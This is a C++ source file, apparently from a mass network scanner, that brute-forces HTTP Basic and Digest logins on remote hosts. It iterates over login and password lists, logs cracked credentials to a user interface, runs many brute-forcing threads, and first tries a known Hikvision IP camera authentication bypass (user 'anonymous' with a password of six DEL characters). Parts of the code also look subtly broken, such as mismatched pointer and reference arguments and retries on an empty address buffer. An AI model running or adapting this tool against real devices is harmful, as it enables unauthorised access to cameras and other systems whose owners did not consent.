#include "BasicAuth.h"

int BA::checkOutput(const string& buffer, const char* ip, const int port) {
    const std::vector<std::string> successPatterns = {"200 ok", "http/1.0 200", "http/1.1 200"};
    const std::vector<std::string> failPatterns = {
        "http/1.1 401 ", "http/1.0 401 ", "<statusValue>401</statusValue>",
        "<statusString>Unauthorized</statusString>", "íåïðàâèëüíû",
        "ÐÐµÐ¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ñ‹", "code: \"401\""
    };

    auto findIgnoreCase = [](const std::string& str, const std::string& substr) {
        return std::search(
            str.begin(), str.end(),
            substr.begin(), substr.end(),
            [](char ch1, char ch2) { return std::tolower(ch1) == std::tolower(ch2); }
        ) != str.end();
    };

    bool success = std::any_of(successPatterns.begin(), successPatterns.end(),
                               [&](const std::string& pattern) { return findIgnoreCase(buffer, pattern); });
    bool fail = std::any_of(failPatterns.begin(), failPatterns.end(),
                            [&](const std::string& pattern) { return findIgnoreCase(buffer, pattern); });

    if (success && !fail) return 1;
    if (findIgnoreCase(buffer, "http/1.1 404") || findIgnoreCase(buffer, "http/1.0 404")) return -2;

    const std::vector<std::string> retryPatterns = {
        "503 service unavailable", "http/1.1 503", "http/1.0 503",
        "400 BAD_REQUEST", "400 bad request", "403 Forbidden"
    };

    if (std::any_of(retryPatterns.begin(), retryPatterns.end(),
                    [&](const std::string& pattern) { return findIgnoreCase(buffer, pattern); })) {
        std::this_thread::sleep_for(std::chrono::seconds(30));
        return -1;
    }

    return 0;
}

//http://www.coresecurity.com/advisories/hikvision-ip-cameras-multiple-vulnerabilities 2
inline bool commenceHikvisionEx1(std::string_view ip, int port, bool digestMode) {
    if (!validateIP(ip) || port <= 0 || port > 65535) {
        return false;
    }

    constexpr char DELCHAR = '\177';
    constexpr size_t PASSWORD_LENGTH = 6;

    std::string lpString = "anonymous:" + std::string(PASSWORD_LENGTH, DELCHAR);

    std::string buffer;
    Connector con;
    
    try {
        int res = con.nConnect(ip.data(), port, &buffer, nullptr, nullptr, &lpString, digestMode);
        if (res > 0) {
            return BA::checkOutput(&buffer, ip.data(), port) == 1;
        }
    } catch (const std::exception& e) {
        // Логирование ошибки
        return false;
    }

    return false;
}

std::string getLocation(const std::string_view& buff) {
    // Константа для поиска, вычисляемая на этапе компиляции
    constexpr std::string_view LOCATION_PREFIX = "location: ";

    // Функция для сравнения символов без учета регистра
    auto caseInsensitiveCompare = [](char a, char b) {
        return std::tolower(static_cast<unsigned char>(a)) == 
               std::tolower(static_cast<unsigned char>(b));
    };

    // Поиск подстроки "location: " без учета регистра
    auto it = std::search(
        buff.begin(), buff.end(),
        LOCATION_PREFIX.begin(), LOCATION_PREFIX.end(),
        caseInsensitiveCompare
    );

    // Если подстрока найдена
    if (it != buff.end()) {
        // Начало значения location
        auto valueStart = it + LOCATION_PREFIX.length();
        // Поиск конца строки (символ новой строки)
        auto valueEnd = std::find(valueStart, buff.end(), '\r');
        
        // Возвращаем найденное значение
        return std::string(valueStart, valueEnd);
    }

    // Если подстрока не найдена, возвращаем пустую строку
    return "";
}

void setNewIP(const char *ipOrig, char *ip, std::string *buff, int size) {
    std::string location = getLocation(buff);
    
    // Безопасное копирование исходного IP
    strncpy(ip, ipOrig, size - 1);
    ip[size - 1] = '\0';

    if (!location.empty()) {
        if (location.find("http") != std::string::npos) {
            // Если location содержит "http", копируем его в ip
            strncpy(ip, location.c_str(), size - 1);
            ip[size - 1] = '\0';
        } else {
            const char* slashPos = strchr(ipOrig + 8, '/');
            if (slashPos != nullptr) {
                // Если в ipOrig есть '/', копируем часть до '/' и добавляем location
                ptrdiff_t ipLength = slashPos - ipOrig;
                if (ipLength < size) {
                    strncpy(ip, ipOrig, ipLength);
                    strncat(ip, location.c_str(), size - ipLength - 1);
                    ip[size - 1] = '\0';
                }
            } else {
                // Если '/' нет, просто добавляем location к ip
                strncat(ip, location.c_str(), size - strlen(ip) - 1);
                ip[size - 1] = '\0';
            }
        }
    }
}
lopaStr BA::BABrute(const char *ipOrig, const int port, bool performDoubleCheck) {
	bool digestMode = true;
	string lpString;
    lopaStr lps = {"UNKNOWN", "", ""};
    int passCounter = 0;
	int res = 0;
	int rowIndex = -1;

	std::string buff;
	Connector con;

	int sz = con.nConnect(ipOrig, port, &buff);

	if (Utils::ustrstr(&buff, "404 not found") != -1 || Utils::ustrstr(&buff, "404 site") != -1) {
		return lps;
	}

	char ip[256] = { 0 };
	
	if (sz == 0) {
		if (performDoubleCheck) {
			//Retry
			Sleep(gTimeOut);
			sz = con.nConnect(ip, port, &buff);
			if (sz == 0) {
				Sleep(gTimeOut);
				sz = con.nConnect(ip, port, &buff);
				if (sz == 0) {
					QString ipString = QString(ip);
					stt->doEmitionFoundData("<span style=\"color:orange;\">Empty BA probe - <a style=\"color:orange;\" href=\"" + ipString + "/\">" + ipString + "</a></span>");
					return lps;
				}
				else {
					setNewIP(ipOrig, ip, &buff, 256);
				}
			}
			else {
				setNewIP(ipOrig, ip, &buff, 256);
			}
		}
		else {
			QString ipString = QString(ip);
			stt->doEmitionFoundData("<span style=\"color:orange;\">Empty BA probe - <a style=\"color:orange;\" href=\"" + ipString + "/\">" + ipString + "</a></span>");
			return lps;
		}
	}
	else {
		setNewIP(ipOrig, ip, &buff, 256);
	}

	int isDig = Utils::isDigest(&buff);
	if (-2 == isDig) {
		QString ipString = QString(ip);
		stt->doEmitionFoundData("<span style=\"color:orange;\">404 not found - <a style=\"color:orange;\" href=\"" + ipString + "/\">" + ipString + "</a></span>");
		return lps;
	}
	if (isDig == -1) {
		if (performDoubleCheck) {
			Sleep(gTimeOut);
			int sz = con.nConnect(ip, port, &buff);
			isDig = Utils::isDigest(&buff);
			if (isDig == -1) {
				Sleep(gTimeOut);
				int sz = con.nConnect(ip, port, &buff);
				isDig = Utils::isDigest(&buff);
				if (isDig == -1) {
					QString ipString = QString(ip);
					stt->doEmitionFoundData("<span style=\"color:orange;\">No 401 found - <a style=\"color:orange;\" href=\"" + ipString + "/\">" + ipString + "</a></span>");
					return lps;
				}
			}
		}
		else {
			QString ipString = QString(ip);
			stt->doEmitionFoundData("<span style=\"color:orange;\">No 401 found - <a style=\"color:orange;\" href=\"" + ipString + "/\">" + ipString + "</a></span>");
			return lps;
		}
	}
	else if (isDig == 1) digestMode = true; 
	else digestMode = false;

	std::string buffer;

	if (commenceHikvisionEx1(ip, port, digestMode)) {
		strcpy(lps.login, "anonymous");
		strcpy(lps.pass, "\177\177\177\177\177\177");
		return lps;
	}

	char login[32] = { 0 };
	char pass[32] = { 0 };
    for(int i = 0; i < MaxLogin; ++i) {
		FileUpdater::cv.wait(FileUpdater::lk, [] {return FileUpdater::ready; });
		strcpy(login, loginLst[i]);
        for (int j = 0; j < MaxPass; ++j) {
            FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready;});
            if (!globalScanFlag) return lps;

			strcpy(pass, passLst[j]);

            lpString = string(login) + ":" + string(pass);

			Connector con;
			res = con.nConnect(ip, port, &buffer, NULL, NULL, &lpString, digestMode);
			if (res == -2) {
				rowIndex = Utils::addBARow(QString(ip), QString(login) + ":" + QString(pass), "TIMEOUT", rowIndex);
				
				return lps;
			}
			else if (res != -1) {
				res = checkOutput(&buffer, ip, port);
				if (res == -2) {

					rowIndex = Utils::addBARow(QString(ip), "--", "404", rowIndex);
					strcpy(lps.other, "404");
					return lps;
				}
				if (res == -1) {
					++i;
					break;
				}
				if (res == 1) {
					rowIndex = Utils::addBARow(QString(ip), QString(login) + ":" + QString(pass), "OK", rowIndex);

					strcpy(lps.login, login);
					strcpy(lps.pass, pass);
					return lps;
				};
			}

			rowIndex = Utils::addBARow(QString(ip), QString(login) + ":" + QString(pass), QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%", rowIndex);
			++passCounter;
            Sleep(50);
        }
    }

	rowIndex = Utils::addBARow(QString(ip), "--", "FAIL", rowIndex);
    return lps;
}


lopaStr BA::BALobby(const std::string& ip, int port, bool performDoubleCheck) {
    static std::atomic<int> BrutingThrds(0);
    
    if (gMaxBrutingThreads > 0) {
        while (BrutingThrds >= gMaxBrutingThreads) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }

        ++baCount;
        ++BrutingThrds;
        stt->doEmitionUpdateArc(gTargets);
        
        lopaStr lps = BABrute(ip.c_str(), port, performDoubleCheck);
        
        --BrutingThrds;
        return lps;
    } else {
        return {"UNKNOWN", "", ""};
    }
}
